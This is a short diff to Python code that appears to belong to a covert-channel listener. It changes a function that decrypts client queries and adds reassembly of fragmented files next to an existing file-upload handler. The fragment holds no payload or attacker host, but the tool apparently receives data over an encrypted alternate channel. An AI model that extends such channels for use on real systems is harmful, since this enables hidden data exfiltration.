@@ -1,4 +1,5 @@
 from Crypto.Cipher import AES
+import network
 import base64
 import socket
 import utils
@@ -75,9 +76,11 @@ def listen_alt_channel(timeout):
                 except IndexError:
                     pass
                 if 'fragments' in decrypted_query.split(':'):
-                    N = decrypted_query.split(':')[1]
+                    N = decrypted_query.split(':')[1].split(' = ')[0]
+                    name_out = decrypted_query.split(' = ')[1]
                     print '[*] %s is requesting fragmented file re-assembly of %s fragments' %\
                           (client_addr[0], N)
+                    network.defragment(int(N), name_out)
                 # Upload file
                 try:
                     if 'PUT' in decrypted_query.split('_'):
